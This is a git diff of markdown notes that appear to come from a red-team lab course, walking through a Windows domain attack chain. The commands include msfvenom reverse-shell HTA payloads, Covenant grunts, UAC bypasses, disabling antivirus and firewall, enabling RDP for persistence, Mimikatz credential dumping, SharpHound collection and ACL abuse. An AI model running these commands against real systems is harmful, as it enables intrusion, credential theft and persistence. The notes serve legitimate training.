@@ -55,6 +55,7 @@
 	- **Ensure the `launcher KillDate` is set to a future date**
 - On Kali:
 	- Create script `Benefits.hta`
+
 ```shell
 # Defanged script
 
@@ -69,8 +70,8 @@
 	  DoStuff
 	  self.close
 <\script>
-
 ```
+
 - Start `Covenant`
 	- Go to `Covenenant`
 		- Go to `Listeners`
@@ -238,6 +239,7 @@
 ### UAC Bypass with Metasploit
 - Refer to link below to generate a quick reverse shell
 	- [[Metasploit Quick Shell Setup]]
+
 ```bash
 - On kali host:
 	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f hta-psh -o Benefits.hta`
@@ -255,6 +257,7 @@
 			- `exploit`
 - On Windows Host execute the relevant shell created in `Downloads`
 ```
+
 - `run post/multi/recon/local_exploit_suggester`
 	- Copy: `exploit/windows/local/bypassuac_dotnet_profiler`
 - Background session with `CTRL+z`
@@ -287,6 +290,7 @@
 - Ensure the Windows host Firewall does not interfere with testing by disabling it
 - Refer too:
 	- [[Disable Windows AntiVirus on Startup]]
+
 ```bash
 - `gpedit`
 	- `Computer Configuration`
@@ -315,6 +319,7 @@
 - If `gpedit` is not functioning properly refer too:
 	- [[Gpedit Issue Resolution]]
 ```
+
 - On `Covenant` ensure you have a `High` level privilege
 	- Click on the `High` level privilege *grunt* in `Grunts` tab
 	- Go to `Tasks`
@@ -387,6 +392,7 @@
 ### Session Passing to Metasploit SOCKS, and the Autoroute Module
 - Open a grunt with `Covenant`
 	- [[Covenant Quick Shell on Windows Host]]
+
 ```bash
 - Open `Covenant`
 	- Set up a listener in `Listeners` tab
@@ -406,6 +412,7 @@
 ```
 - Paste the generated payload into the Windows host `powershell.exe` window
 ```
+
 - On Kali:
 	- `msfconsole`
 		- `search web_delivery`
@@ -468,6 +475,7 @@
 ### Persistence via RDP
 - Open a grunt with `Covenant`
 	- [[Covenant Quick Shell on Windows Host]]
+
 ```bash
 - Open `Covenant`
 	- Set up a listener in `Listeners` tab
@@ -484,11 +492,14 @@
 ```
 
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
+
 ```
 - Paste the generated payload into the Windows host `powershell.exe` window
 ```
+
 - Open a `High` level grunt
 	- [[Fodhelper UAC Bypass with Covenant]]
+
 ```bash
 - **High level privileges**
 - Open `Coveneant`
@@ -513,6 +524,7 @@
 			- Add the recently generated shellcode *.bin* file
 		- `Execute`
 ```
+
 - Execute in `High` level grunt:
 	- Enables *RDP* on Windows host
 	- `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
@@ -526,6 +538,7 @@
 - This requires a `High` level grunt
 - Open a grunt with `Covenant`
 	- [[Covenant Quick Shell on Windows Host]]
+
 ```bash
 - Open `Covenant`
 	- Set up a listener in `Listeners` tab
@@ -542,11 +555,14 @@
 ```
 
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
+
 ```
 - Paste the generated payload into the Windows host `powershell.exe` window
 ```
+
 - Open a `High` level grunt
 	- [[Fodhelper UAC Bypass with Covenant]]
+
 ```bash
 - **High level privileges**
 - Open `Coveneant`
@@ -571,6 +587,7 @@
 			- Add the recently generated shellcode *.bin* file
 		- `Execute`
 ```
+
 - Execute in `High` level grunt:
 	- `Mimikatz token::elevate lsadump::secrets`
 		- Locate any *cahced* credentials with the above output
@@ -651,6 +668,7 @@
 ### Cracking the Credential Vault via Metasploit
 - Open a `Medium` integrity `meterpreter` session
 	- [[Metasploit Quick Shell Setup]]
+
 ```bash
 - On kali host:
 	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f hta-psh -o Benefits.hta`
@@ -668,6 +686,7 @@
 			- `exploit`
 - On Windows Host execute the relevant shell created in `Downloads`
 ```
+
 - In `meterpreter`
 	- `upload /opt/Tools/mimikatz_trunk/x64/mimikatz.exe C:\\Users\\Public\\mimikatz.exe`
 	- `shell`
@@ -841,6 +860,7 @@
 ### Brief Overview of the Domain Through BloodHound
 - Open a grunt with `Covenant`
 	- [[Covenant Quick Shell on Windows Host]]
+
 ```bash
 - Open `Covenant`
 	- Set up a listener in `Listeners` tab
@@ -857,9 +877,11 @@
 ```
 
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
+
 ```
 - Paste the generated payload into the Windows host `powershell.exe` window
 ```
+
 - In `Grunt`:
 	- `ChangeDirectory C:\Users\Public`
 		- `Upload`
@@ -889,6 +911,7 @@
 ### Abusing ACLs
 - Open a grunt with `Covenant`
 	- [[Covenant Quick Shell on Windows Host]]
+
 ```bash
 - Open `Covenant`
 	- Set up a listener in `Listeners` tab
@@ -905,9 +928,11 @@
 ```
 
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
+
 ```
 - Paste the generated payload into the Windows host `powershell.exe` window
 ```
+
 - In `Grunt`:
 	- `ChangeDirectory C:\Users\Public`
 		- `Upload`
@@ -919,6 +944,7 @@
 	- Download and execute `Sharphound`
 		- Refer too:
 			- [[Execute SharpHound on Windows Host With Covenant]]
+
 ```bash
 - Open a grunt with `Covenant`
 	- [[Covenant Quick Shell on Windows Host]]
@@ -929,11 +955,14 @@
 				- Ensure the version of `Sharphound` is the same as the bloodhound install
 	- `shell sharphound.exe -c all`
 ```
+
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20221127040208.png)
+
 ```
 - `download 20221127035950_BloodHound.zip`
 	- Make sure to **click** the download on `Covenant` to download 
 ```
+
 	- Check user groups for `s.chisholm`
 		- If `s.chisholm` is not yet in the *engineering* group
 			- `net group engineering s.chisholm /add /domain`
@@ -957,6 +986,7 @@
 - On `Covenant` obtain a `High` integrity shell
 	- Refer too:
 		- [[Fodhelper UAC Bypass with Covenant]]
+
 ```bash
 - **High level privileges**
 - Open `Coveneant`
@@ -981,6 +1011,7 @@
 			- Add the recently generated shellcode *.bin* file
 		- `Execute`
 ```
+
 - `Mimikatz token::elevate lsadump::sam`
 - Copy `j.taylor` hashes
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20221127092647.png)
@@ -1004,6 +1035,7 @@
 - On `Covenant` obtain a `High` integrity shell
 	- Refer too:
 		- [[Fodhelper UAC Bypass with Covenant]]
+
 ```bash
 - **High level privileges**
 - Open `Coveneant`
@@ -1028,6 +1060,7 @@
 			- Add the recently generated shellcode *.bin* file
 		- `Execute`
 ```
+
 - In a shell:
 	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=25 -f raw -o /root/Desktop/msf.bin`
 	- `msfconsole`
@@ -1103,6 +1136,7 @@
 - **Step by step follow for this instance and still failure. The only deviations were to meet the corresponding dynamic IPs on my system. 2 Covenant system level integrity shells both Workstation-01**
 - Open a grunt with `Covenant`
 	- [[Covenant Quick Shell on Windows Host]]
+
 ```bash
 - Open `Covenant`
 	- Set up a listener in `Listeners` tab
@@ -1119,9 +1153,11 @@
 ```
 
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
+
 ```
 - Paste the generated payload into the Windows host `powershell.exe` window
 ```
+
 - On Kali:
 	- `msfconsole`
 		- `search web_delivery`
